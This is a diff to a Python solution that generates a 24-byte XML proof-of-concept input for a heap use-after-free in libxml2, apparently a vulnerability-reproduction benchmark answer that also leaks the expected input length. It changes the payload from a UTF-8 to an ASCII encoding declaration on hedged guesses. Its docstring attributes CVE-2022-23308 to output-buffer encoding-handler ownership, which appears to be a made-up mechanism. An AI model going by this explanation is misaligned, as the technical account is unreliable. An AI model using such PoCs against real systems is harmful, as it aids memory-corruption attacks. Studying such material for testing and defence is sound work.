@@ -1,18 +1,16 @@
 import sys
-import os
 
 class Solution:
     def solve(self, src_path: str) -> bytes:
         """
-        Generate a PoC that triggers the vulnerability.
+        Generate a PoC that triggers the Heap Use After Free vulnerability in libxml2.
+        The vulnerability (CVE-2022-23308) occurs in xmlOutputBufferCreate/xmlAllocOutputBufferInternal
+        when an encoding handler is provided. The handler might be double-freed if the buffer creation
+        fails (e.g. in calling functions like xmlOutputBufferCreateFilename) or if ownership logic is flawed.
         
-        The vulnerability (CVE-2022-23308) is a Heap Use-After-Free in libxml2's io module,
-        specifically in xmlAllocOutputBuffer/xmlAllocOutputBufferInternal.
-        It is triggered when an output buffer is created with an encoding handler, and ownership
-        logic is mishandled (e.g., during serialization).
+        Using an encoding like "ASCII" ensures a char encoding handler is allocated (unlike UTF-8 which
+        might be handled internally/NULL).
         
-        The ground truth length is 24 bytes.
-        '<?xml encoding="UTF-8"?>' is exactly 24 bytes and sets the document encoding to "UTF-8",
-        which triggers the vulnerable code path during output buffer creation.
+        The string '<?xml encoding="ASCII"?>' is exactly 24 bytes.
         """
-        return b'<?xml encoding="UTF-8"?>'
+        return b'<?xml encoding="ASCII"?>'
